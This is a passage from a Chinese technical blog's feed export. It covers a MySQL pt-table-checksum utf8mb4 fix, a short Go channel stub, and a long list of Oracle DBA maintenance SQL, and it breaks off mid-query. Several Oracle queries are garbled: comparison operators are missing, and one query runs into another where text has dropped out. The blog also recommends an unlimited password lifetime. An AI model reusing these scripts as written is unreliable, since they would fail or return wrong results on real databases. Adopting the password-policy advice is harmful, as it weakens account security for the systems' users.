    <content type="text"><![CDATA[“别再抱怨你此生找不到一个对的人，当初的数学选择题就四个，你也找不到对的答案啊” 前言昨天帮同事解决主从同步的问题。 原因是同事使用Django开发了一套运维平台。但是里面的表使用了FOREIGN KEY，在插入的是报错。造成了主从同步错误，数据量不大，使用pt-table-checksum来校验主从数据 操作一、先跳过主从错误，主从同步关系恢复正常。1234STOP SLAVE sql_thread;SET GLOBAL sql_slave_skip_counter = 1;START SLAVE sql_thread;SHOW SLAVE STATUS\G 二、使用 pt-table-checksum1pt-table-checksum --set-vars innodb_lock_wait_timeout=200 --nocheck-replication-filters --no-check-binlog-format --replicate=test.checksums --create-replicate-table --databases=***** --host=*** --port=*** --user=*** --password='*****' --recursion-method='processlist' 12345678910111213Error setting innodb_lock_wait_timeout: DBD::mysql::db do failed: Variable 'innodb_lock_wait_timeout' is a read only variable [for Statement "SET SESSION innodb_lock_wait_timeout=1"]. The current value for innodb_lock_wait_timeout is 50. If the variable is read only (not dynamic), specify --set-vars innodb_lock_wait_timeout=50 to avoid this warning, else manually set the variable and restart MySQL.Checking if all tables can be checksummed ...Starting checksum ...Error setting innodb_lock_wait_timeout: DBD::mysql::db do failed: Variable 'innodb_lock_wait_timeout' is a read only variable [for Statement "SET SESSION innodb_lock_wait_timeout=1"]. The current value for innodb_lock_wait_timeout is 50. If the variable is read only (not dynamic), specify --set-vars innodb_lock_wait_timeout=50 to avoid this warning, else manually set the variable and restart MySQL.05-13T18:42:19 Error executing EXPLAIN SELECT COUNT(*) AS cnt, COALESCE(LOWER(CONV(BIT_XOR(CAST(CRC32(CONCAT_WS('#', `id`, convert(`uuid` using utf8mb4), convert(`city` using utf8mb4), convert(`bassert` using utf8mb4), convert(`hostname` using utf8mb4), `idc_id`, `dp_id`, convert(`vlanip` using utf8mb4), convert(`wlanip` using utf8mb4), convert(`remote_ip` using utf8mb4), convert(`network_card` using utf8mb4), convert(`mac` using utf8mb4), convert(`serverown` using utf8mb4), convert(`status` using utf8mb4), convert(`rack` using utf8mb4), convert(`unit` using utf8mb4), convert(`sysversion` using utf8mb4), `order_time`, convert(`comment` using utf8mb4), `update_time`, `onlinetime`, `offlinetime`, convert(`roles` using utf8mb4), convert(`services` using utf8mb4), convert(`install_status` using utf8mb4), convert(`service_env` using utf8mb4), convert(`host_type` using utf8mb4), convert(`kvm_local` using utf8mb4), CONCAT(ISNULL(`order_time`), ISNULL(`onlinetime`), ISNULL(`offlinetime`), ISNULL(`roles`), ISNULL(`services`)))) AS UNSIGNED)), 10, 16)), 0) AS crc FROM `bportal`.`server_basic_info` /*explain checksum table*/: DBD::mysql::st execute failed: Unknown character set: 'utf8mb4' [for Statement "EXPLAIN SELECT COUNT(*) AS cnt, COALESCE(LOWER(CONV(BIT_XOR(CAST(CRC32(CONCAT_WS('#', `id`, convert(`uuid` using utf8mb4), convert(`city` using utf8mb4), convert(`bassert` using utf8mb4), convert(`hostname` using utf8mb4), `idc_id`, `dp_id`, convert(`vlanip` using utf8mb4), convert(`wlanip` using utf8mb4), convert(`remote_ip` using utf8mb4), convert(`network_card` using utf8mb4), convert(`mac` using utf8mb4), convert(`serverown` using utf8mb4), convert(`status` using utf8mb4), convert(`rack` using utf8mb4), convert(`unit` using utf8mb4), convert(`sysversion` using utf8mb4), `order_time`, convert(`comment` using utf8mb4), `update_time`, `onlinetime`, `offlinetime`, convert(`roles` using utf8mb4), convert(`services` using utf8mb4), convert(`install_status` using utf8mb4), convert(`service_env` using utf8mb4), convert(`host_type` using utf8mb4), convert(`kvm_local` using utf8mb4), CONCAT(ISNULL(`order_time`), ISNULL(`onlinetime`), ISNULL(`offlinetime`), ISNULL(`roles`), ISNULL(`services`)))) AS UNSIGNED)), 10, 16)), 0) AS crc FROM `bportal`.`server_basic_info` /*explain checksum table*/"] at /usr/bin/pt-table-checksum line 12302.05-13T18:42:19 Error checksumming table bportal.server_basic_info: Error executing checksum query: DBD::mysql::st execute failed: Unknown character set: 'utf8mb4' [for Statement "REPLACE INTO `test`.`checksums` (db, tbl, chunk, chunk_index, lower_boundary, upper_boundary, this_cnt, this_crc) SELECT ?, ?, ?, ?, ?, ?, COUNT(*) AS cnt, COALESCE(LOWER(CONV(BIT_XOR(CAST(CRC32(CONCAT_WS('#', `id`, convert(`uuid` using utf8mb4), convert(`city` using utf8mb4), convert(`bassert` using utf8mb4), convert(`hostname` using utf8mb4), `idc_id`, `dp_id`, convert(`vlanip` using utf8mb4), convert(`wlanip` using utf8mb4), convert(`remote_ip` using utf8mb4), convert(`network_card` using utf8mb4), convert(`mac` using utf8mb4), convert(`serverown` using utf8mb4), convert(`status` using utf8mb4), convert(`rack` using utf8mb4), convert(`unit` using utf8mb4), convert(`sysversion` using utf8mb4), `order_time`, convert(`comment` using utf8mb4), `update_time`, `onlinetime`, `offlinetime`, convert(`roles` using utf8mb4), convert(`services` using utf8mb4), convert(`install_status` using utf8mb4), convert(`service_env` using utf8mb4), convert(`host_type` using utf8mb4), convert(`kvm_local` using utf8mb4), CONCAT(ISNULL(`order_time`), ISNULL(`onlinetime`), ISNULL(`offlinetime`), ISNULL(`roles`), ISNULL(`services`)))) AS UNSIGNED)), 10, 16)), 0) AS crc FROM `bportal`.`server_basic_info` /*checksum table*/" with ParamValues: 0='bportal', 1='server_basic_info', 2=1, 3=undef, 4=undef, 5=undef] at /usr/bin/pt-table-checksum line 11691. TS ERRORS DIFFS ROWS DIFF_ROWS CHUNKS SKIPPED TIME TABLE05-13T18:42:19 2 0 0 0 1 0 0.008 bportal.server_basic_info 于是排除问题： 查看MySQL 版本 查看MySQL 字符集 查看数据库和表的字符集google查找问题原因发现篇文章和该错误几乎一致。说到pt-table-checksum已经不支持MySQL 5.1版本。12345Thank you for the report.The error is expected since character set utf8mb4 Unknown to the MySQL 5.1MySQL 5.1 is not a supported version: https://www.percona.com/services/support/mysql-support/percona-toolkit-supported-platforms-and-versions 写了一个patch pt-table-checksum打补丁1patch pt-table-checksum < pt-table-checksum.utf8mb4.patch 执行命令1pt-table-checksum --set-vars innodb_lock_wait_timeout=200 --nocheck-replication-filters --no-check-binlog-format --replicate=test.checksums --create-replicate-table --databases=***** --host=*** --port=*** --user=*** --password='*****' --recursion-method='processlist' 发现没有上面的问题，一切都正常。在执行1pt-table-sync --replicate=test.checksums --databases=***** --charset=utf8 h=****,P=****,u=****,p='****' --execute 总结使用MySQL 5.1版本的数据库赶快升级吧。太折腾人了。 参考 Percona: jira document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Toolkit</category>
      </categories>
      <tags>
        <tag>Toolkit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图解Go的channel底层原理]]></title>
    <url>%2F2019%2F05%2F05%2Fgo-channal-graphic%2F</url>
    <content type="text"><![CDATA[努力不一定成功，但是不努力会很舒服的哦! 前言channel的整体结构图 简单说明： buf是有缓冲的channel所特有的结构，用来存储缓存数据。是个循环链表 sendx和recvx用于记录buf这个循环链表中的~发送或者接收的~index lock是个互斥锁。 recvq和sendq分别是接收(]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最全Oracle DBA日常维护SQL脚本命令]]></title>
    <url>%2F2019%2F04%2F26%2Foracle-ops-sql%2F</url>
    <content type="text"><![CDATA[“原谅他们是上帝的事，我们的任务是负责送他们见上帝。” SQL 语句查询碎片程度高（实际使用率小于30%）的表可以收缩的表条件为什么block>100，因为一些很小的表，只有几行数据实际大小很小，但是block一次性分配就是5个（11g开始默认一次性分配1M的block大小了，见create table storged的NEXT参数），5个block相对于几行小表数据来说就相差太大了。 算法中/0.9是因为块的pfree一般为10%，所以一个块最多只用了90%，而且一行数据大于8KB时容易产生行链接，把一行分片存储，一样的一个块连90%都用不满 ，AVG_ROW_LEN还是比较准的，比如个人实验情况一表6个字段，一个number，其他5个都是char(100)但是实际数据都是’1111111’7位，AVG_ROW_LEN显示依然为513 。123456789SELECT TABLE_NAME, (BLOCKS * 8192/1024/1024) "理论大小M", (NUM_ROWS * AVG_ROW_LEN/1024/1024/0.9) "实际大小M", ROUND((NUM_ROWS * AVG_ROW_LEN/1024/1024/0.9)/(BLOCKS * 8192/1024/1024), 3) * 100|| '%' "实际使用率%"FROM USER_TABLESWHERE blocks > 100 AND (NUM_ROWS * AVG_ROW_LEN/1024/1024/0.9)/(BLOCKS * 8192/1024/1024) < 0.3ORDER BY (NUM_ROWS * AVG_ROW_LEN/1024/1024/0.9)/(BLOCKS * 8192/1024/1024) DESC 查询索引碎片的比例索引删除行数除以索引总行数的百分比>30%即认为索引碎片大，也就是需要重建的索引12345678910SELECT name, del_lf_rows, lf_rows, ROUND(del_lf_rows/decode(lf_rows, 0, 1, lf_rows) * 100, 0)||'%' frag_pctFROM index_statsWHERE ROUND(del_lf_rows/decode(lf_rows, 0, 1, lf_rows) * 100,0) > 30; 集群因子clustering_factor高的表集群因子越接近块数越好，接近行数则说明索引列的列值相等的行分布极度散列，可能不走索引扫描而走全表扫描 ： 方法一：1234567891011121314151617SELECT tab.table_name, tab.blocks, tab.num_rows, ind.index_name, ind.clustering_factor, ROUND(nvl(ind.clustering_factor, 1)/decode(tab.num_rows, 0, 1, tab.num_rows), 3) * 100||'%' "集群因子接近行数"FROM user_tables tab, user_indexes indWHERE tab.table_name = ind.table_name AND tab.blocks>100 AND nvl(ind.clustering_factor, 1)/decode(tab.num_rows, 0, 1, tab.num_rows) BETWEEN 0.35 AND 3 方法二：12345678910111213141516171819SELECT tab.owner, tab.table_name, tab.blocks, tab.num_rows, ind.index_name, ind.clustering_factor, round(nvl(ind.clustering_factor, 1)/decode(tab.num_rows, 0, 1, tab.num_rows), 3)*100||'%' "集群因子接近行数"FROM dba_tables tab, dba_indexes indWHERE tab.table_name=ind.table_name AND tab.owner NOT IN ('SYS', 'SYSTEM', 'WMSYS', 'DBSNMP', 'CTXSYS', 'XDB', 'ORDDATA', 'SYSMAN', 'CATALOG', 'APEX_030200', 'MDSYS', 'OLAPSYS', 'EXFSYS') AND tab.blocks > 100 AND nvl(ind.clustering_factor, 1)/decode(tab.num_rows, 0, 1, tab.num_rows) BETWEEN 0.35 AND 3 根据sid查spid或根据spid查sid1234567891011121314151617SELECT s.sid, s.serial#, p.spid, s.terminal, s.LOGON_TIME, s.status, s.PROGRAM, s.CLIENT_IDENTIFIER, s.machine, s.action, s.MODULE, s.PROCESS "客户端机器进程号", s.osuserFROM v$session s, v$process pWHERE s.paddr=p.addr AND s.sid=XX OR p.spid=YY 根据sid查看具体的sql语句，不要加条件v$session.status='ACTIVE'，比如toad对同一数据库开两个连接会话，都执行了一些语句，其中一个窗口查询select * from v$session时会发现另一个窗口在v$session.status是INACTIVE，并不代表另一个窗口没有执行过sql语句，而当前窗口是active状态，对应的sql_id对应的语句就是select * from v$session而不是之前执行过的sql语句，ACTIVE表示当前正在执行sql。一个sid可能执行过很多个sql，所以有时需要的sql通过如下查不到是正常的，比如查询到某死锁源sid，通过如下查询可能只是个select语句，而真正引起死锁的sql却查不到，是因为可能这个sid持续了很长时间，这个sid之前执行的一些sql在v$sql可能已经被清除了。 方法一：12345678910111213141516171819202122232425262728293031323334SELECT username, sid, SERIAL#, LOGON_TIME, status, PROGRAM, CLIENT_IDENTIFIER, machine, action, PROCESS "客户端机器进程号", osuser, sql_textFROM v$session a, v$sqltext_with_newlines bWHERE DECODE(a.sql_hash_value, 0, prev_hash_value, sql_hash_value) = b.hash_value AND a.sid=&sidORDER BY piece; ``` ##### 方法二:```bashSELECT username, sid, SERIAL#, LOGON_TIME, status, sql_fulltext, PROGRAM, CLIENT_IDENTIFIER, machine, a.action, PROCESS "客户端机器进程号", osuserFROM v$session a, v$sql bWHERE DECODE(a.sql_hash_value, 0, prev_hash_value, sql_hash_value) = b.hash_value AND a.sid=&sid 如果上面语句执行太慢，则按如下两步12345678910111213141516SELECT sql_hash_value, prev_hash_value, username, sid.SERIAL#, LOGON_TIME, status, PROGRAM, CLIENT_IDENTIFIER, machine, action, PROCESS "客户端机器进程号", osuserFROM v$sessionWHERE sid=&sidSELECT sql_fulltextFROM v$sqlWHERE hash_value=XX XX为上面 sql_hash_value，如果 sql_hash_value为0，则XX为上面 prev_hash_value 根据spid查询具体的sql语句(不要加条件v$session.status=’ ACTIVE’,比如toad对同一数据库开两个连接会话，都执行了一些语句，其中一个窗口查询select from v$session时会发现另一个窗口在v$session.status是INACTIVE，并不代表另一个窗口没有执行过sql语句，而当前窗口是active状态，对应的sql_id对应的语句就是select from v$session而不是之前执行过的sql语句，ACTIVE表示当前正在执行sql。)123456789101112131415161718192021SELECT ss.SID, ss.SERIAL#, ss.LOGON_TIME, pr.SPID, sa.SQL_FULLTEXT, ss.machine, ss.TERMINAL, ss.PROGRAM, ss.USERNAME, ss.CLIENT_IDENTIFIER, ss.action, ss.PROCESS "客户端机器进程号", ss.STATUS, ss.OSUSER, ss.status, ss.last_call_et, sa.sql_textFROM v$process pr, v$session ss, v$sql saWHERE pr.ADDR = ss.PADDR AND DECODE(ss.sql_hash_value, 0, prev_hash_value, sql_hash_value)=sa.hash_value AND pr.spid=&spid 查看历史session_id的SQL来自哪个IP查看trace文件名就可以知道spid,trace文件里面有sid和具体sql，如果trace存在incident，那trace就看不到具体sql，但是可以在incident文件中看到具体的sql，如DW_ora_17751.trc中17751就是spid，里面有这样的内容Incident 115 created, dump file: /XX/incident/incdir_115/DW_ora_17751_i115.trc，那么在DW_ora_17751_i115.trc就可以看到具体的sql语句) DB_ora_29349.trc中出现1*** SESSION ID:(5057.12807) 2016-10-26 14:45:52.726 通过表V$ACTIVE_SESSION_HISTORY来查123456SELECT a.sql_id, a.machine, a.*FROM V$ACTIVE_SESSION_HISTORY aWHERE a.session_id=5057 AND a.SESSION_SERIAL#=12807 查询上面的machine的IP123456789SELECT s.sid, s.serial#, s.LOGON_TIME, s.machine, p.spid, p.terminalFROM v$session s, v$process pWHERE s.paddr=p.addr AND s.machine='localhost' 通过上面的spid在oracle服务器上执行netstat -anp |grep spid即可123[oracle@dwdb trace]$ netstat -anp |grep 17630 tcp 210 0 192.168.64.228:11095 192.168.21.16:1521 ESTABLISHED 17630/oracleDB tcp 0 0 ::ffff:192.168.64.228:1521 ::ffff:192.168.64.220:59848 ESTABLISHED 17630/oracleDB 出现两个，说明来自220，连接了228数据库服务器，但是又通过228服务器的dblink去连接了16服务器 查询死锁堵塞的会话sid最简单的一个SQL1234select * from V$SESSION_BLOCKERS select * from dba_waiters 最常用的一个SQL12345678910111213SELECT sid, status, LOGON_TIME, sql_id, blocking_session "死锁直接源", FINAL_BLOCKING_SESSION "死锁最终源", event, seconds_in_wait "会话锁住时间_S", LAST_CALL_ET "会话STATUS持续时间_S"FROM v$sessionWHERE state='WAITING' AND BLOCKING_SESSION_STATUS='VALID' AND FINAL_BLOCKING_SESSION_STATUS='VALID' 可以把两者SID放入v$session，发现LOGON_TIME字段FINAL_BLOCKING_SESSION比SID要早 BLOCKING_SESSION:Session identifier of the blocking session. This column is valid only if BLOCKING_SESSION_STATUS has the value VALID. FINAL_BLOCKING_SESSION:Session identifier of the blocking session. This column is valid only if FINAL_BLOCKING_SESSION_STATUS has the value VALID. 如果遇到RAC环境，一定要用gv$来查，并且执行alter system kill session 'sid,serial#'要到RAC对应的实例上去执行 把上面被堵塞会话的sid代入如下语句，可以发现锁住的对象和对象的哪一行(如果sid是堵塞源的会话，则 row_wait_obj#=-1，表示锁持有者，就是死锁源了 )1234567891011SELECT s.sid, s.username, d.owner, d.object_name, s.row_wait_obj#, s.row_wait_row#, s.row_wait_file#, s.row_wait_block#FROM v$session s, dba_objects dWHERE s.row_wait_obj# = d.object_id AND s.sid in(XX,XX) 查询锁住的DDL对象123456SELECT d.session_id, s.SERIAL#, d.nameFROM dba_ddl_locks d, v$session sWHERE d.owner = 'MKLMIGEM' AND d.SESSION_ID=s.sid 查询超过两个小时的不活动会话12345678910111213141516171819202122SELECT s.sid, s.serial#, p.spid, s.LOGON_TIME, s.LAST_CALL_ET, s.status, s.PROGRAM, s.CLIENT_IDENTIFIER, s.machine, s.terminal, s.action, s.PROCESS "客户端机器进程号", s.osuserFROM v$session s, v$process pWHERE s.paddr=p.addr AND s.sid IN (SELECT sid FROM v$session WHERE machine &DB服务器名称 AND status='INACTIVE' AND sql_id is null AND LAST_CALL_ET > 7200 ) 查询堵塞别的会话超过30分钟且自身是不活动的会话12345678910111213141516SELECT username, sid, serial#, status, seconds_in_wait, LAST_CALL_ETFROM v$sessionWHERE sid IN (SELECT FINAL_BLOCKING_SESSION FROM v$session WHERE state='WAITING' AND BLOCKING_SESSION_STATUS='VALID' AND FINAL_BLOCKING_SESSION_STATUS='VALID') AND status='INACTIVE' AND sql_id is null AND seconds_in_wait>1800 查询可能存在连接池空闲初始配置过大的连接（来自同一台机器的同一个程序的状态为INACTIVE的连接非常多）12345678910SELECT count(ss.SID), ss.machine, ss.status, ss.TERMINAL, ss.PROGRAM, ss.USERNAME, ss.CLIENT_IDENTIFIERFROM v$session ssGROUP BY ss.machine,ss.status,ss.TERMINAL,ss.PROGRAM,ss.USERNAME,ss.CLIENT_IDENTIFIERHAVING count(ss.SID)>10 查询当前正在执行的sql1234567891011121314SELECT s.sid, s.serial#, s.username, spid, v$sql.sql_id, machine, s.terminal, s.program, sql_textFROM v$process,v$session s,v$sqlWHERE addr=paddr AND s.sql_id=v$sql.sql_id AND sql_hash_value=hash_value AND s.STATUS='ACTIVE' 查询正在执行的SCHEDULER_JOB123456789SELECT owner, job_name, sid, b.SERIAL#, b.username, spidFROM ALL_SCHEDULER_RUNNING_JOBS,v$session b,v$processWHERE session_id=sid AND paddr=addr 查询正在执行的dbms_job12345678SELECT job, b.sid, b.SERIAL#, b.username, spidFROM DBA_JOBS_RUNNING a ,v$session b,v$processWHERE a.sid=b.sid AND paddr=addr 查询一个会话session、process平均消耗多少PGA内存，查看下面avg_used_M值123456789SELECT round(sum(pga_used_mem)/1024/1024, 0) total_used_M, round(sum(pga_used_mem)/count(1)/1024/1024, 0) avg_used_M, round(sum(pga_alloc_mem)/1024/1024, 0) total_alloc_M, round(sum(pga_alloc_mem)/count(1)/1024/1024, 0) avg_alloc_MFROM v$process; TOP 10 执行次数排序1234567891011SELECT *FROM (SELECT executions, username, PARSING_USER_ID, sql_id, sql_text FROM v$sql,dba_users WHERE user_id=PARSING_USER_ID ORDER BY executions desc)WHERE rownum sysdate-18 AND FIRST_TIME>ADD_MONTHS(SYSDATE,-1) ORDER BY FIRST_TIME)GROUP BY TO_CHAR(first_time, 'MM/DD')ORDER BY MIN(RN); 查询lgwr进程写日志时每执行一次lgwr需要多少秒，在state是waiting的情况下，某个等待编号seq#下，seconds_in_wait达多少秒，就是lgwr进程写一次IO需要多少秒12345678SELECT event, state, seq#, seconds_in_wait, programFROM v$sessionWHERE program LIKE '%LGWR%' AND state='WAITING' 查询没有索引的表123456789101112SELECT table_nameFROM user_tablesWHERE table_name NOT IN (SELECT table_name FROM user_indexes)SELECT table_nameFROM user_tablesWHERE table_name NOT IN (SELECT table_name FROM user_ind_columns) 查询一个AWR周期内的平均session数、OS平均负载、平均db time、平均每秒多少事务12345678910111213SELECT to_char(max(BEGIN_TIME), 'yyyy-mm-dd hh24:mi')||to_char(max(end_time),'* hh24:mi') time, snap_id, trunc(sum(case metric_name WHEN 'Session Count' THEN average end),2) sessions, trunc(sum(case metric_name WHEN 'Current OS Load' THEN average end),2) OS_LOAD, (trunc(sum(case metric_name WHEN 'Database Time Per Sec' THEN average end),2)/100)*(ceil((max(end_time)-max(BEGIN_TIME))*24*60*60)) Database_Time_second, trunc(sum(case metric_name WHEN 'User Transaction Per Sec' THEN average end),2) User_Transaction_Per_SecFROM dba_hist_sysmetric_summaryGROUP BY snap_idORDER BY snap_id; Database Time Per Sec对应值的单位是百分一秒/每秒 (/100)(ceil((max(end_time)-max(BEGIN_TIME))246060))是代表每个snap周期内的总秒数，oracle 两个时间相减默认的是天数,2460*60 为相差的秒数 这个SQL查到的DB TIME比较准确，和awr上面的db time比较一致 查询产生热块较多的对象x$bh .tch(Touch)表示访问次数越高，热点快竞争问题就存在123456789101112131415161718SELECT e.owner, e.segment_name, e.segment_typeFROM dba_extents e, (SELECT * FROM (SELECT addr, ts#, file#, dbarfil, dbablk, tch FROM x$bh ORDER BY tch DESC) WHERE ROWNUM < 11) b WHERE e.relative_fno = b.dbarfil AND e.block_id b.dbablk; 手工创建快照的语句1exec dbms_workload_repository.create_snapshot; AWR设置每隔30分钟收集一次报告，保留14天的报告123exec DBMS_WORKLOAD_REPOSITORY.MODIFY_SNAPSHOT_SETTINGS(retention=>14*24*60, interval=>30); select * from dba_hist_wr_control; AWR基线查看和创建123select * from dba_hist_baseline; exec DBMS_WORKLOAD_REPOSITORY.CREATE_BASELINE(start_snap_id=>7550,end_snap_id=>7660,baseline_name=>'am_baseline'); 导出AWR报告的SQL语句12345678SELECT *FROM dba_hist_snapshotSELECT *FROM table(dbms_workload_repository.awr_report_html(DBID, INSTANCE_NUMBER, startsnapid,endsnapid))SELECT *FROM TABLE(DBMS_WORKLOAD_REPOSITORY.awr_diff_report_html(DBID, INSTANCE_NUMBER, startsnapid,endsnapid, DBID, INSTANCE_NUMBER, startsnapid,endsnapid)); 导出最新ADDM的报告（需要sys用户）1234567891011121314SELECT dbms_advisor.get_task_report(task_name)FROM dba_advisor_tasksWHERE task_id = (SELECT max(t.task_id) FROM dba_advisor_tasks t, dba_advisor_log l WHERE t.task_id=l.task_id AND t.advisor_name='ADDM' AND l.status='COMPLETED' );SELECT task_id, task_name, descriptionFROM dba_advisor_tasksORDER BY 1 DESCSELECT dbms_advisor.get_task_report(task_name)FROM dba_advisor_tasksWHERE task_id =XX 查询某个SQL的执行计划12SELECT *FROM table(dbms_xplan.display_cursor('sql_id',0,' advanced ')); 上面的0表示v$sql.child_number为0，如果一个sql_id在v$sql中有多行说明有多个child_number，要看哪儿child_number的执行计划，就写哪个的值，比如要看child_number为2的执行计划，就把上面sql的0改为2 。 官方文档对display_cursor这个函数的说明里面没有advanced这个参数值，只有BASIC、TYPICAL、ALL这几个，不过实践中发现advanced这个参数值显示的内容比这几个参数值显示的都多。12SELECT *FROM table(xplan.display_cursor('v$sql.sql_id',0,'advanced')); 创建xplan包，再执行12SQL> CREATE PUBLIC SYNONYM XPLAN FOR SYS.XPLAN; SQL> grant execute on sys.xplan to public; 查询Rman的配置信息123SELECT NAME, VALUEFROM V$RMAN_CONFIGURATION; 查询Rman备份集详细信息（未过期的，过期并已删除的查不到）123456789101112SELECT B.RECID BackupSet_ID, A.SET_STAMP, DECODE (B.INCREMENTAL_LEVEL, '', DECODE (BACKUP_TYPE, 'L', 'Archivelog', 'Full'), 1, 'Incr-1级', 0, 'Incr-0级', B.INCREMENTAL_LEVEL) "Type LV", B.CONTROLFILE_INCLUDED "包含CTL", DECODE (A.STATUS, 'A', 'AVAILABLE', 'D', 'DELETED', 'X', 'EXPIRED', 'ERROR') "STATUS", A.DEVICE_TYPE "Device Type", A.START_TIME "Start Time", A.COMPLETION_TIME "Completion Time", A.ELAPSED_SECONDS "Elapsed Seconds", A.BYTES/1024/1024/1024 "Size(G)", A.COMPRESSED, A.TAG "Tag", A.HANDLE "Path"FROM GV$BACKUP_PIECE A, GV$BACKUP_SET BWHERE A.SET_STAMP = B.SET_STAMP AND A.DELETED = 'NO'ORDER BY A.COMPLETION_TIME DESC; 查询Rman备份进度123456789SELECT SID, SERIAL#, opname, ROUND(SOFAR/TOTALWORK*100)||'%' "%_COMPLETE", TRUNC(elapsed_seconds/60) || ':' || MOD(elapsed_seconds,60) elapsed, TRUNC(time_remaining/60) || ':' || MOD(time_remaining,60) remaining, CONTEXT,target,SOFAR, TOTALWORKFROM V$SESSION_LONGOPSWHERE OPNAME LIKE 'RMAN%' AND OPNAME NOT LIKE '%aggregate%' AND TOTALWORK != 0 AND SOFAR TOTALWORK; 查询执行过全表扫描的sql语句的SQL_ID和sql_fulltext12345678910111213141516SELECT s.sid, s.serial#, s.inst_id, s.sql_id, s.username, s.target, s.ELAPSED_SECONDS, s.START_TIME, s.LAST_UPDATE_TIME, v.sql_fulltextFROM gv$session_longops s,gv$sql vWHERE s.OPNAME = 'Table Scan' AND s.SQL_PLAN_OPERATION = 'TABLE ACCESS' AND s.SQL_PLAN_OPTIONS = 'FULL' AND s.sql_id=v.sql_idORDER BY s.LAST_UPDATE_TIME DESC 查询死事务需要多长的回滚时间1X$KTUXE：[K]ernel [T]ransaction [U]ndo Transa[x]tion [E]ntry (table)` X$KTUXE表的一个重要功能是，可以获得无法通过v$transaction来观察的死事务信息，当一个数据库发生异常中断，或者进行延迟事务恢复时，数据库启动后，无法通过V$TRANSACTION来观察事务信息，但是X$KTUXE可以帮助我们获得这些信息。该表中的KTUXECFL代表了事务的Flag标记，通过这个标记可以找到那些Dead事务：12345SQL> select distinct KTUXECFL,count(*) from x$ktuxe group by KTUXECFL; KTUXECFL COUNT(*) ------------------------ ---------- DEAD 1 NONE 2393 KTUXESIZ用来记录事务使用的回滚段块数，可以通过观察这个字段来评估恢复进度,例如如下事务回滚经过测算需要大约3小时12345678910111213141516171819202122SQL> select ADDR,KTUXEUSN,KTUXESLT,KTUXESQN,KTUXESIZ from x$ktuxe where KTUXECFL ='DEAD'; ADDR KTUXEUSN KTUXESLT KTUXESQN KTUXESIZ ---------------- ---------- ---------- ---------- ---------- FFFFFFFF7D07B91C 10 39 2567412 1086075 SQL> select ADDR,KTUXEUSN,KTUXESLT,KTUXESQN,KTUXESIZ from x$ktuxe where KTUXECFL ='DEAD'; ADDR KTUXEUSN KTUXESLT KTUXESQN KTUXESIZ ---------------- ---------- ---------- ---------- ---------- FFFFFFFF7D07B91C 10 39 2567412 1086067 SQL> declare l_start number; l_end number; begin select ktuxesiz into l_start from x$ktuxe where KTUXEUSN=10 and KTUXESLT=39; dbms_lock.sleep(60); select ktuxesiz into l_end from x$ktuxe where KTUXEUSN=10 and KTUXESLT=39; dbms_output.put_line('time_H:'|| round(l_end/(l_start -l_end)/60,2)); end; / time_H:3 把XXX用户下面的某些YYY表赋权给user,XXX\YYY要大写 XXX要大写12345678declare tablename varchar2(200); begin for x IN (SELECT * FROM dba_tables where owner='XXX' and table_name like '%YYY%') loop tablename:=x.table_name; dbms_output.put_line('GRANT SELECT ON XXX.'||tablename||' to user'); EXECUTE IMMEDIATE 'GRANT SELECT ON XXX.'||tablename||' TO user'; end loop; end; Oracle查出一个用户具有的所有系统权限和对象权限系统权限（和用户自己查询select * from session_privs的结果一致）12345678910SELECT *FROM DBA_SYS_PRIVSWHERE GRANTEE = '用户名'UNIONALLSELECT *FROM DBA_SYS_PRIVSWHERE GRANTEE IN (SELECT GRANTED_ROLE FROM DBA_ROLE_PRIVS WHERE GRANTEE = '用户名'); 对象权限（和用户自己查询select * FROM TABLE_PRIVILEGES where GRANTEE='当前用户'的结果一致）12345678910SELECT *FROM DBA_TAB_PRIVSWHERE GRANTEE = '用户名'UNIONALLSELECT *FROM DBA_TAB_PRIVSWHERE GRANTEE IN (SELECT GRANTED_ROLE FROM DBA_ROLE_PRIVS WHERE GRANTEE = '用户名'); 查询某个用户拥有的角色123SELECT *FROM dba_role_privsWHERE GRANTEE='用户名'; 查询拥有DBA角色权限的用户123SELECT *FROM dba_role_privsWHERE GRANTED_ROLE='DBA'; 查询某个角色拥有的系统权限123SELECT *FROM ROLE_SYS_PRIVSWHERE role='角色名' 清除某个SQL的执行计划1Exec DBMS_SHARED_POOL.PURGE('v$sqlarea.ADDRESS,v$sqlarea.HASH_VALUE','c') 查询密码是否有过期限制，默认是180天，一般修改为unlimited1234567SELECT *FROM dba_profilesWHERE profile='DEFAULT' AND RESOURCE_NAME LIKE 'PASSWORD%'; ALTER PROFILE DEFAULT LIMIT PASSWORD_LIFE_TIME UNLIMITED 查询和修改隐含参数（必须在sysdba权限下操作）123456789SELECT a.ksppinm name, b.ksppstvl value, a.ksppdesc descriptionFROM x$ksppi a, x$ksppcv bWHERE a.indx = b.indx AND a.ksppinm LIKE '%_small_table_threshold%' alter system set "_small_table_threshold"=value scope=both sid='*'; 不加sid则说明在默认在RAC的所有实例中修改 需要注意的是一定要加上双引号, 另外引号内不能有空格, 只能包含参数的名字 评估SGA该设置多少1234567SELECT SGA_SIZEFROM (SELECT * FROM V$SGA_TARGET_ADVICE WHERE ESTD_DB_TIME_FACTOR=1 ORDER BY 1)WHERE rownum=1; 查看shared pool还剩多少1234SELECT *FROM v$sgastatWHERE name='free memory' AND pool='shared pool'; 统计所有表的容量大小(含分区字段、LOB字段)一般先执行select distinct SEGMENT_TYPE from dba_segments where owner'SYS' and tablespace_name'SYSAUX'查看到所有的segment_type123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960SELECT owner, table_name, TRUNC(sum(bytes)/1024/1024) MegFROM (SELECT segment_name table_name, owner, bytes FROM dba_segments WHERE segment_type = 'TABLE' UNION ALLSELECT s.segment_name table_name, pt.owner, s.bytes FROM dba_segments s, dba_part_tables pt WHERE s.segment_name = pt.table_name AND s.owner = pt.owner AND s.segment_type = 'TABLE PARTITION' UNION ALLSELECT i.table_name, i.owner, s.bytes FROM dba_indexes i, dba_segments s WHERE s.segment_name = i.index_name AND s.owner = i.owner AND s.segment_type = 'INDEX' UNION ALLSELECT pi.table_name, pi.owner, s.bytes FROM 